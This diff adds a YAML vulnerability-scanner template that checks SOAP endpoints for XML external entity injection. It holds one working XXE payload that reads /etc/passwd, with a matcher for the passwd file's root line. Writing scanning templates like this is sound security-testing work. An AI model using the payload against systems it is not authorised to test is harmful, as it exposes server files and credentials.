@@ -1,0 +1,22 @@
+id: patt-xxe-soap-01-xml
+name: 'PATT xxe patt-xxe-soap-01 via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+requires:
+  - java
+  - dotnet
+description: 'PATT XXE SOAP Envelope. [patt:patt-xxe-soap-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Envelope>&xxe;</Envelope>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
